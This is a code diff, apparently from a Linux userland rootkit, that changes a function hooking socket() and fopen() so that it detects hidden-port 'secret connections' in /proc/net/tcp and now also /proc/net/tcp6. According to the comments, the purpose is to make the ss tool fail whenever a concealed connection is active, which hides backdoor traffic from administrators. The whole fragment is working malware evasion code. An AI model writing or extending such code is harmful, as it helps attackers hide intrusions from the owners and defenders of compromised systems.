@@ -57,26 +57,34 @@ int secret_connection(char line[]){
     return 0;
 }
 
-// ss uses socket to list open sockets. socket()
-// uses this function to break itself if a. calling process is ss
-//                                     + b. a hidden port is in use
 int hideport_alive(void){
-    char line[LINE_MAX];
-    FILE *fp;
-    int status = 0;
-
+    char line[LINE_MAX];                       /* ss uses socket() to list open sockets.   */
+    FILE *fp;                                  /* our socket() hook uses this function to  */
+    int status = 0;                            /* break itself if a. calling process is ss */
+                                               /*               + b. hidden port is in use */
     hook(CFOPEN);
     fp = call(CFOPEN, "/proc/net/tcp", "r");
     if(fp == NULL) return 0;
-
     while(fgets(line, sizeof(line), fp) != NULL){
         if(secret_connection(line)){
             status = 1;
             break;
         }
     }
-
     fclose(fp);
+
+    if(status != 1){   /* check /proc/net/tcp6 too. */
+        fp = call(CFOPEN, "/proc/net/tcp6", "r");
+        if(fp == NULL) return 0;
+        while(fgets(line, sizeof(line), fp) != NULL){
+            if(secret_connection(line)){
+                status = 1;
+                break;
+            }
+        }
+        fclose(fp);
+    }
+
     return status;
 }
 
